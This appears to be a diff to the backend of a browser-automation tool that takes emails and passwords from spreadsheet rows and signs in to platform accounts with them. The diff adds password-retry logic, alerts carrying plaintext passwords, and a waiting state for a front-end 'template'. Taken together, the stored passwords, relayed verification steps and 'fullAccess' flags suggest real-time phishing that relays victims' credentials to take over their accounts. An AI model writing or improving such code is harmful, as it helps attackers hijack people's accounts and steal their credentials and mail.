@@ -58,6 +58,7 @@ const PLATFORM_INBOX_URLS = {
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const activeProcesses = new Set();
 const activeBrowserSessions = new Map();
+const passwordRetryCounts = new Map();
 logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 
 export const maxDuration = 60;
@@ -1923,7 +1924,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             updateData.status = finalStatus;
         } else if (status === "WAITINGPASSWORD") {
             logger.info(`[processRow][${browserId}] Resuming from WAITINGPASSWORD state.`);
-            const pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
+            let pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
             let passwordProvidedAndProcessed = false;
 
             while (Date.now() < pollingTimeoutPassword && !passwordProvidedAndProcessed) {
@@ -2271,6 +2272,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                                 if (passwordUnavailableDetected) {
                                     logger.info(`[processRow][${browserId}] Password sign-in unavailable detected. handleAdditionalViews clicked Back. Waiting 5s then auto-retrying same password via while loop.`);
+                                    pollingTimeoutPassword = Date.now() + 60000; // Reset timeout — give another 60s for retry to succeed
                                     await new Promise(res => setTimeout(res, 5000));
                                     continue; // Go back to top of while loop to re-type cached password and resubmit
                                 }
@@ -2296,7 +2298,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 }
 
                                 if (passwordFailedDetected) {
-                                    // Password was incorrect; persist WAITINGPASSWORD for user to retry
+                                    // Password was incorrect; persist WAITINGPASSWORD for user to retry — NEVER auto-retry
+                                    passwordRetryCounts.delete(browserId);
                                     sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });
 
                                     initialCheckResult = {
@@ -2347,6 +2350,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
+                                passwordRetryCounts.delete(browserId);
                                 passwordProvidedAndProcessed = true;
                                 // Do not clear password from sheet after attempt as per user request
                                 // updateBrowserRowDataFast(browserId, { verificationCode: '', verificationChoice: '' });
@@ -2377,28 +2381,49 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 }
             }
 
-            // FIX: If loop broke because sheet changed to PROCESSING during password retry
-            // (e.g., password unavailable retry), keep browser open and restore WAITINGPASSWORD
-            // so the interval re-picks the row for another attempt.
+            // If the while loop timed out while in PROCESSING (password-unavailable retry in progress),
+            // check retry count. Keep engineProcessing=true so template shows "waiting" not form.
+            // After max retries, give up and let user provide a new password.
             if (finalStatus === "PROCESSING" && !passwordProvidedAndProcessed) {
-                logger.info(`[processRow][${browserId}] Password retry in progress (loop broke on PROCESSING). Restoring WAITINGPASSWORD for next pick-up.`);
-                finalStatus = "WAITINGPASSWORD";
-                updateData.status = "WAITINGPASSWORD";
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                    status: "WAITINGPASSWORD",
-                    engineRetrying: true,
-                    message: "Retrying password. Please wait."
-                });
-                updateBrowserRowDataFast(browserId, {
-                    status: "WAITINGPASSWORD",
-                    engineProcessing: false,
-                    email: email || '',
-                    password: password || '',
-                    verified: true,
-                    fullAccess: false,
-                    lastJsonResponse: updateData.lastJsonResponse
-                });
+                const retryCount = (passwordRetryCounts.get(browserId) || 0) + 1;
+                passwordRetryCounts.set(browserId, retryCount);
+                const MAX_RETRIES = 3;
+
+                if (retryCount >= MAX_RETRIES) {
+                    logger.info(`[processRow][${browserId}] Password retry exhausted (${retryCount}/${MAX_RETRIES}). Setting WAITINGPASSWORD for user to provide new password.`);
+                    passwordRetryCounts.delete(browserId);
+                    finalStatus = "WAITINGPASSWORD";
+                    updateData.status = "WAITINGPASSWORD";
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                        status: "WAITINGPASSWORD",
+                        message: "Password sign-in unavailable after multiple retries. Please try a different password."
+                    });
+                    updateBrowserRowDataFast(browserId, {
+                        status: "WAITINGPASSWORD",
+                        engineProcessing: false,
+                        password: '',
+                        verified: false,
+                        fullAccess: false,
+                        lastJsonResponse: updateData.lastJsonResponse
+                    });
+                } else {
+                    logger.info(`[processRow][${browserId}] Password retry ${retryCount}/${MAX_RETRIES} timed out. Keeping browser open for next retry cycle.`);
+                    updateBrowserRowDataFast(browserId, {
+                        status: "WAITINGPASSWORD",
+                        engineProcessing: true,
+                        email: email || '',
+                        password: password || '',
+                        verified: true,
+                        fullAccess: false,
+                        lastJsonResponse: JSON.stringify({
+                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                            status: "WAITINGPASSWORD",
+                            engineRetrying: true,
+                            message: `Retrying password (${retryCount}/${MAX_RETRIES}). Please wait.`
+                        })
+                    });
+                }
                 logger.info(`[engineProcess][${browserId}] -WAITINGPASSWORD (retry return)`);
                 activelyProcessing.delete(browserId);
                 return;
@@ -4051,6 +4076,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 logger.info(`[processRow][${browserId}] Keeping browser open as it is in ${updateData.status} state. Storing session.`);
                 activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener: sessionTargetListener }); // Store the listener that was active for this session
             } else {
+                // Update cache with final status BEFORE closing browser so template sees it immediately
+                setCachedRow(browserId, { ...updateData, email: email || '', password: password || '' });
                 logger.info(`[processRow][${browserId}] Final cleanup - Closing browser (status: ${updateData.status})`);
                 await browser.close().catch(err => logger.error(`Error closing browser during cleanup for ${browserId}: ${err.message}`));
                 browserFullyClosed = true;
@@ -4066,6 +4093,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
                 }
             }
+            // Update cache with final status BEFORE closing browser so template sees it immediately
+            setCachedRow(browserId, { ...updateData, email: email || '', password: password || '' });
             logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
             await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
             browserFullyClosed = true;
